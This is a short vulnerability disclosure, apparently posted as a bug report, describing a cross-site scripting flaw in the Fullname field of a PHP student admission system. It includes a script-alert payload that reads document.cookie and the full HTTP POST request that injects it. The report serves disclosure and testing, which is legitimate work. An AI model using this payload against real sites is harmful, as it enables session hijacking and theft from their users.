# Online Student Admission System v1.0 by Walterjnr1 has Cross Site Scripting

BUG_Author: ppgod

vendors:https://www.sourcecodester.com/php/14874/online-student-admission-system.html

Vulnerability File: online-admission-system-RITMAN/apply/admission.php

XSS vulnerability at Fullname

![image](https://github.com/ppwink/pic/blob/main/admi.png)

Payload: <script>alert(document.cookie)</script>

```
POST /online-admission-system-RITMAN/apply/admission.php HTTP/1.1
Host: localhost
Content-Length: 203
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/online-admission-system-RITMAN/apply/admission.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=1j6s1p5feop3me379jbfoi898d
Connection: close

txtfullname=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&cmdsex=Male&txtphone=1&txtemail=2%40gmail.com&txtlga=+3&txtstate=4&txtjambno=5&txtjambscore=6&txtfaculty=7&txtdept=8&txtexam=9&btnsubmit=
```

After clicking the Submit button, the xss box will pop up

![image](https://github.com/ppwink/pic/blob/main/xss.png)
